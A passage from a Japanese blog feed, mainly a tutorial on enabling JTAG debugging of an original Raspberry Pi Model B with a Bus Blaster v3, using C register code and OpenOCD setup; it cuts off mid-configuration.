<p>“ようやく” 環境を引っ越せました、と書いたように、届いてから使えるようにするまでかなり時間がかかってしまいました。というのも設定がある程度済んできた開封日の夜、Secure Boot 関連の設定をしていたときのことでした。UEFI のセットアップメニューから再起動したところ、30秒くらい文字がバーッと流れ、その後ブートループするようになってしまったのです。</p>
<blockquote class="twitter-tweet tw-align-center" data-dnt="true">
<p lang="und" dir="ltr">
…… <a href="https://t.co/gDHQjU6yuA">pic.twitter.com/gDHQjU6yuA</a>
</p>
— ✧<em>。ヾ(｡ᐳ﹏ᐸ｡)ﾉﾞ。</em>✧ (@myon___) <a href="https://twitter.com/myon___/status/1291738440212475906?ref_src=twsrc%5Etfw">August 7, 2020</a>
</blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<p><a href="https://forums.lenovo.com/t5/ThinkPad-P-and-W-Series-Mobile/P73-endless-POST-loop-Configuration-changed-Restart-the-system/m-p/4593233">フォーラムのこんな投稿</a>を見つけ不安になったりしましたが、サポートに電話したところすぐ修理を手配してもらえました。8/17 に引き取りに来て、8/26 に帰ってきました。この件に関して、自分も普段あまりいじるべきでないところをいじっていたというのもあるのでクレームなどを言う気は全く無いですが、今後のアップデートでファームウェアの安定性はもっと上がるといいなと思います。また何かあっても嫌なので、Secure Boot の設定はまた違う方法、<a href="https://aur.archlinux.org/packages/shim-signed/">Shim</a> を使ったもので簡単に済ませました。</p>
<p>とまぁこんな感じにトラブルなどありましたが、今度のマシンも長く使っていけるといいなと思います (✿╹◡╹)ﾉ</p>
<section class="footnotes footnotes-end-of-document" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p><a href="https://twitter.com/myon___/status/1086778627000172544/" class="uri">https://twitter.com/myon___/status/1086778627000172544/</a><a href="https://blog.myon.info/entry/2020/09/01/thinkpad-x13/#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p>デスクはなく、床または小さな台に座っての作業となった<a href="https://blog.myon.info/entry/2020/09/01/thinkpad-x13/#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p>キーボードをずっと見て打つことはなくても、ふとした時に見えないと不安で打てなくなるタイプなので<a href="https://blog.myon.info/entry/2020/09/01/thinkpad-x13/#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4" role="doc-endnote"><p>今の Windows で初期設定時ローカルアカウントを作る方法、ネットワークに接続しない以外にない感じなんですかね…<a href="https://blog.myon.info/entry/2020/09/01/thinkpad-x13/#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn5" role="doc-endnote"><p>Fast Boot や GOP 目的で、Linux を使う場合でも自分で生成した鍵でカーネルを署名して Secure Boot を有効にしている<a href="https://blog.myon.info/entry/2020/09/01/thinkpad-x13/#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn6" role="doc-endnote"><p><a href="https://wiki.archlinux.org/index.php/Unified_Extensible_Firmware_Interface/Secure_Boot#shim_with_key_and_GRUB">署名された EFI バイナリであっても chainload できない</a>らしく、実際にやろうとしてもうまく行かなかったので<a href="https://blog.myon.info/entry/2020/09/01/thinkpad-x13/#fnref6" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>]]></summary>
</entry>
<entry>
    <title>Bus Blaster で Raspberry Pi Model B を JTAG デバッグしてみる</title>
    <link href="https://blog.myon.info/entry/2020/07/05/bus-blaster/index.html" />
    <id>https://blog.myon.info/entry/2020/07/05/bus-blaster/index.html</id>
    <published>2020-07-04T16:18:20Z</published>
    <updated>2020-07-04T16:18:20Z</updated>
    <summary type="html"><![CDATA[<p>JTAG デバッガが欲しくなったので <a href="http://dangerousprototypes.com/docs/Bus_Blaster">Bus Blaster v3</a> を買いました。</p>
<blockquote class="twitter-tweet tw-align-center">
<p lang="ja" dir="ltr">
Bus Blaster v3 きた (JTAG したくなったので) <a href="https://t.co/fQRNPmFthV">pic.twitter.com/fQRNPmFthV</a>
</p>
— ✧<em>。ヾ(｡ᐳ﹏ᐸ｡)ﾉﾞ。</em>✧ (@myon___) <a href="https://twitter.com/myon___/status/1277843634268721152?ref_src=twsrc%5Etfw">June 30, 2020</a>
</blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<p>よくある <a href="https://www.ftdichip.com/Products/ICs/FT2232H.htm">FT2232H</a> が載っているやつですが、<a href="http://dangerousprototypes.com/docs/Bus_Blaster_v3_design_overview#Buffered_interface">出力側に CPLD をいれる</a>ことで、ターゲットの駆動電圧 (1.5v ~ 3.3v) に合わせたレベル変換やロジック書き換えによる別規格への対応などを実現した、なるほど〜ってなる設計に惹かれました。公式で紹介されている <a href="https://www.seeedstudio.com/Bus-Blaster-v3.html">Seeed Studio の販売ページ</a> では売り切れだったので、<a href="https://www.marutsu.co.jp/pc/i/27355200/">マルツオンライン</a>を使いました。</p>
<!--more-->
<h2 id="raspberry-pi-model-b-で使ってみる">Raspberry Pi Model B で使ってみる</h2>
<p>ということで早速使ってみます。ターゲットには、手持ちのデバイスで一番遊びやすそうだった Raspberry Pi Model B を選びました。最近の Raspberry Pi はかなり性能・機能が強くなっているようですが、これは初代の Raspberry Pi です。2020年の記事ですが初代です。</p>
<h3 id="raspberry-pi-と-bus-blaster-を接続する">Raspberry Pi と Bus Blaster を接続する</h3>
<p>Raspberry Pi Model B に載っている SoC の BCM2835 は、GPIO を入力・出力のほか 6つの Alternate mode が指定でき、そのときの特別な役割が各ピンごとに決められています。これをまとめた表が<a href="https://www.raspberrypi.org/documentation/hardware/raspberrypi/bcm2835/BCM2835-ARM-Peripherals.pdf">ペリフェラルのマニュアル</a>の Table 6-31 にあります。</p>
<p>JTAG 用のピンも、ある GPIO の Alternate mode として実装されています。今回 JTAG に使う GPIO をまとめるとこんな感じになります。TDI は GPIO26 の Alt4 にもありますが、今回使う Raspberry Pi Model B だと基板上のピンヘッダと繋がっていないため、GPIO4 の Alt5 を使います。</p>
<table>
<thead>
<tr class="header">
<th>GPIO</th>
<th>P1 ヘッダのピン番号</th>
<th>JTAG の役割</th>
<th>モード</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>-</td>
<td>1 または 17</td>
<td>VTref (VTG)</td>
<td>-</td>
</tr>
<tr class="even">
<td>GPIO22</td>
<td>15</td>
<td>TRST</td>
<td>Alt4</td>
</tr>
<tr class="odd">
<td>GPIO4</td>
<td>7</td>
<td>TDI</td>
<td>Alt5</td>
</tr>
<tr class="even">
<td>GPIO27</td>
<td>13</td>
<td>TMS</td>
<td>Alt4</td>
</tr>
<tr class="odd">
<td>GPIO25</td>
<td>22</td>
<td>TCK</td>
<td>Alt4</td>
</tr>
<tr class="even">
<td>GPIO24</td>
<td>18</td>
<td>TDO</td>
<td>Alt4</td>
</tr>
<tr class="odd">
<td>-</td>
<td>6, 9, 14, 20, 25 のどれか</td>
<td>GND</td>
<td>-</td>
</tr>
</tbody>
</table>
<p>Raspberry Pi の P1 ヘッダの役割は<a href="https://elinux.org/RPi_Low-level_peripherals#P1_Header">このページの図</a>などがわかりやすいです。これらを参考にしながら Bus Blaster と接続していきます。Bus Blaster は基板上にピンの役割が書いてあるのがいいですね。</p>
<p><img src="https://blog.myon.info/entry/2020/07/05/bus-blaster/IMG_0631.jpg" /></p>
<p><img src="https://blog.myon.info/entry/2020/07/05/bus-blaster/IMG_0630.jpg" /></p>
<p>Bus Blaster の JP4 に刺さっているジャンパピンは、今回は外したほうが良さそうです。JP4 は Bus Blaster からターゲットに給電する・しないを切り替えるものです。Raspberry Pi は電源供給用の USB Micro-B 端子があるので Bus Blaster からの給電は必要ないですし、Bus Blaster から供給できるのは 3.3v 200mA が最大で Raspberry Pi を動かすには弱いためです。</p>
<h3 id="config.txt-から-jtag-デバッグを有効にする-失敗"><code>config.txt</code> から JTAG デバッグを有効にする (失敗)</h3>
<p>Raspberry Pi は、CPU が動き始める前に GPU が様々な初期化を行なう不思議な仕様をしているそうです。そのときに読み込まれる設定ファイルが SD カードに置いた <a href="https://www.raspberrypi.org/documentation/configuration/config-txt/"><code>config.txt</code></a> です。<code>config.txt</code> には <a href="https://www.raspberrypi.org/documentation/configuration/config-txt/gpio.md">GPIO に関する項目</a> もあり、<code>enable_jtag_gpio=1</code> と記述すれば JTAG デバッグに必要な GPIO の設定をやってくれるそうです。</p>
<p>しかしリンク先をよく見ると</p>
<blockquote>
<h5 id="enable_jtag_gpio"><code>enable_jtag_gpio</code></h5>
<p>Setting <code>enable_jtag_gpio=1</code> <strong>selects Alt4 mode for GPIO pins 22-27</strong>, and sets up some internal SoC connections, thus enabling the JTAG interface for the ARM CPU. It works on all models of Raspberry Pi.</p>
</blockquote>
<p>と書いてあり、今回のように TDI に GPIO 4 を使うことは想定されていなさそうです<a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>。</p>
<p>実際にこのオプションを設定した Raspberry Pi で <a href="https://github.com/u-boot/u-boot">U-Boot</a> を起動し、<code>md</code> コマンドで GPIO の機能を指定する GPFSELn レジスタ付近 (<code>0x20200000</code>) を覗いてみた結果がこれです。GPFSEL2 (<code>0x20200008</code>) の値は <code>0x006db6c8</code> (<code>0b011011011011011011001000</code>) で、確かに GPIO 22-27 に対応したビット <code>[23:6]</code> が全て Alt4 (<code>0b011</code>) になっています。しかし GPFSEL0 (<code>0x20200000</code>) の値は <code>0x24864024</code> (<code>0b100100100001100100000000100100</code>) で、GPIO 4 に対応したビット <code>[14:12]</code> は Alt1 (<code>0b100</code>) になっています。残念。</p>
<pre><code>U-Boot 2020.07-rc5-00052-g922c6d5d00 (Jun 25 2020 - 23:58:27 +0900)

DRAM:  448 MiB
RPI Model B rev2 (0xd)
MMC:   mmc@7e202000: 0
In:    serial
Out:   vidconsole
Err:   vidconsole
Net:   No ethernet found.
starting USB...
Bus usb@7e980000: USB DWC2
scanning bus usb@7e980000 for devices... 3 USB Device(s) found
       scanning usb for storage devices... 0 Storage Device(s) found
Hit any key to stop autoboot:  0 
U-Boot&gt; md 20200000 10  
20200000: 24864024 00064024 006db6c8 00000000    $@.$$@....m.....
20200010: 24020004 00000924 00000000 6770696f    ...$$.......oipg
20200020: 6770696f 6770696f 6770696f 6770696f    oipgoipgoipgoipg
20200030: 6770696f 0101c1cf 003e001c 00000000    oipg......&gt;.....</code></pre>
<p><code>config.txt</code> では、各 GPIO のモードやプルアップ・プルダウンの設定を細かく指定できるようです。そこで</p>
<pre><code>gpio=4=pu,a5
gpio=22,24,25,27=pu,a4</code></pre>
<p>と書いてみましたが、これもダメでした。先ほどと同様に U-Boot でレジスタの値を見てみると、GPFSEL2 は <code>0x0061b0c8</code> (<code>0b011000011011000011001000</code>) で意図したとおりの値になっています。しかし GPFSEL0 は <code>0x24864024</code> で GPIO 4 は Alt1 のままです。GPIO 4 のモードは <code>config.txt</code> から設定できない (なにか理由があって Alt1 にされている？) みたいです。これまた残念。</p>
<pre><code>U-Boot&gt; md 20200000 10
20200000: 24864024 00064024 0061b0c8 00000000    $@.$$@....a.....
20200010: 24020004 00000924 00000000 6770696f    ...$$.......oipg
20200020: 6770696f 6770696f 6770696f 6770696f    oipgoipgoipgoipg
20200030: 6770696f 0a41c1cf 003e001c 00000000    oipg..A...&gt;.....</code></pre>
<h3 id="jtag-デバッグ有効化のコードを書く">JTAG デバッグ有効化のコードを書く</h3>
<p><code>config.txt</code> を使った方法がダメだったので、自分で GPIO を設定していきます。GPIO の設定は、上でも軽く触れた BCM2835 の GPIO 周りのレジスタを<a href="https://www.raspberrypi.org/documentation/hardware/raspberrypi/bcm2835/BCM2835-ARM-Peripherals.pdf">ペリフェラルのマニュアル</a> などを参考にしながら操作していけばよいです。</p>
<p>まずは GPIO 4 のモードを Alt5 にします。GPIO 0 ~ 9 のモードは GPFSEL0 レジスタ (<code>0x20200000</code>) で指定します。GPIO 4 に対応するビットは <code>[14:12]</code> で、ここを Alt5 を意味する <code>0b010</code> に変更すればよいです。C で書くとこんな感じになります。<code>~(0x7 &lt;&lt; (4 * 3))</code> との AND をとって <code>[14:12]</code> のビットをクリアし、そのあと <code>0x2 &lt;&lt; (4 * 3)</code> との OR をとって <code>0b010</code> に書き換える、というコードです。</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb4-1"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="dt">volatile</span> <span class="dt">uint32_t</span><span class="op">*</span> GPFSEL0 <span class="op">=</span> <span class="op">(</span><span class="dt">volatile</span> <span class="dt">uint32_t</span><span class="op">*)</span><span class="bn">0x20200000</span><span class="op">;</span></span>
<span id="cb4-2"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb4-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-3"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="dt">uint32_t</span> sel0 <span class="op">=</span> <span class="op">*</span>GPFSEL0<span class="op">;</span></span>
<span id="cb4-4"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb4-4" aria-hidden="true" tabindex="-1"></a>sel0 <span class="op">&amp;=</span> <span class="op">~(</span><span class="bn">0x7</span> <span class="op">&lt;&lt;</span> <span class="op">(</span><span class="dv">4</span> <span class="op">*</span> <span class="dv">3</span><span class="op">));</span> <span class="co">// GPIO4: ALT5</span></span>
<span id="cb4-5"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb4-5" aria-hidden="true" tabindex="-1"></a>sel0 <span class="op">|=</span> <span class="bn">0x2</span> <span class="op">&lt;&lt;</span> <span class="op">(</span><span class="dv">4</span> <span class="op">*</span> <span class="dv">3</span><span class="op">);</span></span>
<span id="cb4-6"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>GPFSEL0 <span class="op">=</span> sel0<span class="op">;</span></span></code></pre></div>
<p>同じように GPIO 22, 24, 25, 27 のモードを Alt4 にします。GPIO 20 ~ 29 のモードは GPFSEL2 レジスタ (<code>0x20200008</code>) で指定します。各 GPIO に対応するビットを、今度は Alt4 を意味する <code>0b011</code> に変更していきます。</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb5-1"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="dt">volatile</span> <span class="dt">uint32_t</span><span class="op">*</span> GPFSEL2 <span class="op">=</span> <span class="op">(</span><span class="dt">volatile</span> <span class="dt">uint32_t</span><span class="op">*)</span><span class="bn">0x20200008</span><span class="op">;</span></span>
<span id="cb5-2"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb5-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb5-3"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="dt">uint32_t</span> sel2 <span class="op">=</span> <span class="op">*</span>GPFSEL2<span class="op">;</span></span>
<span id="cb5-4"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb5-4" aria-hidden="true" tabindex="-1"></a>sel2 <span class="op">&amp;=</span> <span class="op">~(</span><span class="bn">0x7</span> <span class="op">&lt;&lt;</span> <span class="op">(</span><span class="dv">2</span> <span class="op">*</span> <span class="dv">3</span><span class="op">));</span> <span class="co">// GPIO22: ALT4</span></span>
<span id="cb5-5"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb5-5" aria-hidden="true" tabindex="-1"></a>sel2 <span class="op">|=</span> <span class="bn">0x3</span> <span class="op">&lt;&lt;</span> <span class="op">(</span><span class="dv">2</span> <span class="op">*</span> <span class="dv">3</span><span class="op">);</span></span>
<span id="cb5-6"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb5-6" aria-hidden="true" tabindex="-1"></a>sel2 <span class="op">&amp;=</span> <span class="op">~(</span><span class="bn">0x7</span> <span class="op">&lt;&lt;</span> <span class="op">(</span><span class="dv">4</span> <span class="op">*</span> <span class="dv">3</span><span class="op">));</span> <span class="co">// GPIO24: ALT4</span></span>
<span id="cb5-7"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb5-7" aria-hidden="true" tabindex="-1"></a>sel2 <span class="op">|=</span> <span class="bn">0x3</span> <span class="op">&lt;&lt;</span> <span class="op">(</span><span class="dv">4</span> <span class="op">*</span> <span class="dv">3</span><span class="op">);</span></span>
<span id="cb5-8"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb5-8" aria-hidden="true" tabindex="-1"></a>sel2 <span class="op">&amp;=</span> <span class="op">~(</span><span class="bn">0x7</span> <span class="op">&lt;&lt;</span> <span class="op">(</span><span class="dv">5</span> <span class="op">*</span> <span class="dv">3</span><span class="op">));</span> <span class="co">// GPIO25: ALT4</span></span>
<span id="cb5-9"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb5-9" aria-hidden="true" tabindex="-1"></a>sel2 <span class="op">|=</span> <span class="bn">0x3</span> <span class="op">&lt;&lt;</span> <span class="op">(</span><span class="dv">5</span> <span class="op">*</span> <span class="dv">3</span><span class="op">);</span></span>
<span id="cb5-10"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb5-10" aria-hidden="true" tabindex="-1"></a>sel2 <span class="op">&amp;=</span> <span class="op">~(</span><span class="bn">0x7</span> <span class="op">&lt;&lt;</span> <span class="op">(</span><span class="dv">7</span> <span class="op">*</span> <span class="dv">3</span><span class="op">));</span> <span class="co">// GPIO27: ALT4</span></span>
<span id="cb5-11"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb5-11" aria-hidden="true" tabindex="-1"></a>sel2 <span class="op">|=</span> <span class="bn">0x3</span> <span class="op">&lt;&lt;</span> <span class="op">(</span><span class="dv">7</span> <span class="op">*</span> <span class="dv">3</span><span class="op">);</span></span>
<span id="cb5-12"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb5-12" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>GPFSEL2 <span class="op">=</span> sel2<span class="op">;</span></span></code></pre></div>
<p>Raspberry Pi は GPIO のプルアップ・プルダウンをプログラマブルに変更できるようです。これを使って、GPIO 4, 22, 24, 25, 27 のプルアップを有効にします。この操作は接続するデバッガによっては不要かもしれませんが、今回は Bus Blaster と接続したピンを全てプルアップしないとうまく動いてくれませんでした。</p>
<p>プルアップ・プルダウンの指定は次の流れで行います。</p>
<ol type="1">
<li>GPPUD レジスタ (<code>0x20200094</code>) の下位2ビットに値をセット (プルアップなら <code>0b10</code>)</li>
<li>150 サイクルくらい待つ</li>
<li>対象の GPIO に対応した GPPUDCLK0 (<code>0x20200098</code>), GPPUDCLK1 (<code>0x2020009c</code>) レジスタのビットを立てる</li>
<li>150 サイクルくらい待つ</li>
<li>GPPUD, GPPUDCLK0, GPPUDCLK1 をクリア</li>
</ol>
<p>そして、これに対応するコードはこんな感じになります。</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb6-1"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="dt">volatile</span> <span class="dt">uint32_t</span><span class="op">*</span> GPPUD <span class="op">=</span> <span class="op">(</span><span class="dt">volatile</span> <span class="dt">uint32_t</span><span class="op">*)</span><span class="bn">0x20200094</span><span class="op">;</span></span>
<span id="cb6-2"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="dt">volatile</span> <span class="dt">uint32_t</span><span class="op">*</span> GPPUDCLK0 <span class="op">=</span> <span class="op">(</span><span class="dt">volatile</span> <span class="dt">uint32_t</span><span class="op">*)</span><span class="bn">0x20200098</span><span class="op">;</span></span>
<span id="cb6-3"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb6-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-4"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>GPPUD <span class="op">=</span> <span class="dv">2</span><span class="op">;</span>                 <span class="co">// (1)</span></span>
<span id="cb6-5"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb6-5" aria-hidden="true" tabindex="-1"></a>asm<span class="op">(</span><span class="st">&quot;   mov r0, #0x96</span><span class="sc">\n</span><span class="st">&quot;</span>    <span class="co">// (2)</span></span>
<span id="cb6-6"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb6-6" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;1: subs r0, r0, #1</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb6-7"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb6-7" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;   bne 1b&quot;</span></span>
<span id="cb6-8"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb6-8" aria-hidden="true" tabindex="-1"></a>    <span class="op">:</span> <span class="op">:</span> <span class="op">:</span> <span class="st">&quot;r0&quot;</span><span class="op">,</span> <span class="st">&quot;cc&quot;</span><span class="op">);</span></span>
<span id="cb6-9"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>GPPUDCLK0 <span class="op">=</span> <span class="op">(</span><span class="dv">1</span> <span class="op">&lt;&lt;</span> <span class="dv">4</span><span class="op">)</span> <span class="op">|</span> <span class="op">(</span><span class="dv">1</span> <span class="op">&lt;&lt;</span> <span class="dv">22</span><span class="op">)</span> <span class="op">|</span> <span class="op">(</span><span class="dv">1</span> <span class="op">&lt;&lt;</span> <span class="dv">24</span><span class="op">)</span> <span class="op">|</span> <span class="op">(</span><span class="dv">1</span> <span class="op">&lt;&lt;</span> <span class="dv">25</span><span class="op">)</span> <span class="op">|</span> <span class="op">(</span><span class="dv">1</span> <span class="op">&lt;&lt;</span> <span class="dv">27</span><span class="op">);</span>  <span class="co">// (3)</span></span>
<span id="cb6-10"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb6-10" aria-hidden="true" tabindex="-1"></a>asm<span class="op">(</span><span class="st">&quot;   mov r0, #0x96</span><span class="sc">\n</span><span class="st">&quot;</span>    <span class="co">// (4)</span></span>
<span id="cb6-11"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb6-11" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;1: subs r0, r0, #1</span><span class="sc">\n</span><span class="st">&quot;</span></span>
<span id="cb6-12"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb6-12" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;   bne 1b&quot;</span></span>
<span id="cb6-13"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb6-13" aria-hidden="true" tabindex="-1"></a>    <span class="op">:</span> <span class="op">:</span> <span class="op">:</span> <span class="st">&quot;r0&quot;</span><span class="op">,</span> <span class="st">&quot;cc&quot;</span><span class="op">);</span></span>
<span id="cb6-14"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>GPPUD <span class="op">=</span> <span class="dv">0</span><span class="op">;</span>                 <span class="co">// (5)</span></span>
<span id="cb6-15"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>GPPUDCLK0 <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span></code></pre></div>
<p>このコードをデバッグしたいベアメタルなアプリケーションに組み込めば、それが実行された時点からデバッグできるようになります。JTAG 有効化だけを行なうものを SD カードに入れておいて、アプリケーションは常に JTAG 経由でを流し込む、といった使い方もアリだと思います。自分は試していないですが、U-Boot にこれらのコードを組み込むなどすれば、実装したベアメタルアプリケーションはもちろん、Linux カーネルなんかも起動時からデバッグできたりするかもしれません。</p>
<h3 id="openocd-と-gdb-でデバッグしてみる">OpenOCD と GDB でデバッグしてみる</h3>
<p>ハード側の準備ができたので今度はソフトの準備です。今回は OpenOCD と GDB を使ってみます。GDB はおなじみのデバッグツールで、OpenOCD は接続した JTAG デバッガと GDB の橋渡しをしてくれるものです。どちらも Arch Linux 上で <code>pacman</code> からインストールしたものを使いました。バージョンはこんな感じです。</p>
<pre><code>$ sudo pacman -S openocd arm-none-eabi-gdb

$ openocd -v    
Open On-Chip Debugger 0.10.0
Licensed under GNU GPL v2
For bug reports, read
	http://openocd.org/doc/doxygen/bugs.html

$ arm-none-eabi-gdb --version
GNU gdb (GDB) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.</code></pre>
<p>OpenOCD は、<a href="http://openocd.org/doc/html/Running.html#Simple-setup_002c-no-customization">User’s Guide</a> にあるように、JTAG デバッガとターゲットに関する2つの設定ファイル (<a href="http://openocd.org/doc/html/About-Jim_002dTcl.html#About-Jim_002dTcl">Jim-Tcl</a> スクリプト) を <code>-f</code> オプションで渡してやるだけで起動します。Bus Blaster の設定ファイルは OpenOCD に含まれていて <code>interface/ftdi/dp_busblaster.cfg</code> を指定すれば良さそうです。一方 Raspberry Pi の設定ファイルは含まれていないため、別途用意が必要です。今回は<a href="https://tatsu-zine.com/books/raspi-bm">BareMetalで遊ぶ　Raspberry Pi</a> でも紹介されていた <a href="https://github.com/dwelch67/raspberrypi/blob/master/armjtag/raspi.cfg"><code>raspi.cfg</code></a> に、<a href="http://openocd.org/doc/html/Architecture-and-Core-Commands.html#ARM11-specific-commands"><code>arm11 memwrite burst disable</code></a> を追記したものを使いました。自分の環境ではこれを追記しないと、GDB での各操作が不安定だったり、libc などをリンクした少し大きめのバイナリを <code>load</code> させると失敗するなどの症状がありました。</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode tcl"><code class="sourceCode tcl"><span id="cb8-1"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Broadcom 2835 on Raspberry Pi</span></span>
<span id="cb8-2"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-3"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-3" aria-hidden="true" tabindex="-1"></a>telnet_port <span class="dv">4444</span></span>
<span id="cb8-4"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="co">#gdb_port 0</span></span>
<span id="cb8-5"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="co">#tcl_port 0</span></span>
<span id="cb8-6"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-7"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-7" aria-hidden="true" tabindex="-1"></a><span class="co">#jtag_khz 1000</span></span>
<span id="cb8-8"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-8" aria-hidden="true" tabindex="-1"></a>adapter_khz <span class="dv">1000</span></span>
<span id="cb8-9"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-10"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="co">#jtag_nsrst_delay 400</span></span>
<span id="cb8-11"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-11" aria-hidden="true" tabindex="-1"></a><span class="co">#jtag_ntrst_delay 400</span></span>
<span id="cb8-12"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-12" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-13"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-13" aria-hidden="true" tabindex="-1"></a><span class="kw">if</span> <span class="kw">{</span> <span class="kw">[info</span> <span class="ot">exists</span> CHIPNAME<span class="kw">]</span> <span class="kw">}</span> <span class="kw">{</span></span>
<span id="cb8-14"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-14" aria-hidden="true" tabindex="-1"></a>   <span class="kw">set</span>  _CHIPNAME <span class="dt">$CHIPNAME</span></span>
<span id="cb8-15"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-15" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span> <span class="kw">else</span> <span class="kw">{</span></span>
<span id="cb8-16"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-16" aria-hidden="true" tabindex="-1"></a>   <span class="kw">set</span>  _CHIPNAME raspi</span>
<span id="cb8-17"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-17" aria-hidden="true" tabindex="-1"></a><span class="kw">}</span></span>
<span id="cb8-18"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-19"><a href="https://blog.myon.info/entry/2020/07/05/bus-blaster/#cb8-19" aria-hidden="true" tabindex="-1"></a>reset_config none</span>
